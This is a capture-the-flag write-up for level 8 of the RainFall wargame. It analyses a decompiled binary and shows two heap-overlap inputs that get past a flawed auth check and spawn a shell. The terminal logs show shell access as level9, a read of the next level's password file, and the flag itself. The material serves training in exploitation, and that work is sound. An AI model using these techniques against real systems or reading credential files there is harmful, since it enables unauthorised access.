# Level 8

## Analysis

Running our executable prints a '(nil), (nil)', if we try to write anything to stdin, it prints the same thing.

However, when can input two magic words: `auth ` and `service` to get the following result:
```bash
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service 
0x804a008, 0x804a018 
```

After taking a look at the [decomp](./resources/level8_decomp.c), we noticed that these correspond to two globals addresses: `printf("%p, %p \n",auth,service);`.

Another check later which is the most interesting is this one:

```c
if (auth[8] == 0) {
    fwrite("Password:\n",1,10,stdout);
}
else {
    system("/bin/sh");
}
```

This code is triggered when using the `login` keyword during program execution.

`auth` is allocated using a malloc `auth = (undefined4 *)malloc(4);`, it has a size of 32 and is used later in an strcpy call: `strcpy((char *)auth,local_8b);`

While `service` is allocated using an strdup: `service = strdup(acStack_89);`.

## Exploit 1

What we see during the execution and after inputing both `auth ` then `service`, is that the two memory addresses that the program prints are near each other being allocated one after the other.

This can lead to both exploits we found. Both of them rely on the fact that password check happens to only look at the 32nd bit of `auth` (`if (auth[8] == 0)`).

If we could do something to NOT pass this check, we could get to the second branch and spawn a shell.

### Using the commands

Both addresses being near means we can use `service` to overwrite the bit at `auth + 32`, indeed if we type the `service` command another time, we get this output:

```bash
level8@RainFall:~$ ./level8   
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
service
0x804a008, 0x804a028
```

<details>
    <summary>Spoilers</summary>
    What's interesting is that the second address, `service`'s one, happens to be 32 bits after `auth`'s one. Which means that the content at `auth + 32` is no longer equal to 0. Indeed, when trying to run the "login" command after that, we are prompted with the shell, and then we can get the password!

    ```bash
    level8@RainFall:~$ ./level8   
    (nil), (nil) 
    auth 
    0x804a008, (nil) 
    service
    0x804a008, 0x804a018 
    service
    0x804a008, 0x804a028 
    login
    $ whoami
    level9
    $ cat /home/user/level9/.pass
    c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
    $ 
    ```
</details>

## Exploit 2

Using the same principle as above, we can use the commands to bypass the check using another method. 

Instead of incrementing the address two times as we did before, we can also input 32 character after the command to overwrite the 32nd bit:

<details>
    <summary>Spoilers</summary>

    ```bash
    level8@RainFall:~$ ./level8 
    (nil), (nil) 
    auth 
    0x804a008, (nil) 
    service1234567890123456789123456
    0x804a008, 0x804a018 
    login
    $ whoami
    level9
    ```
</details>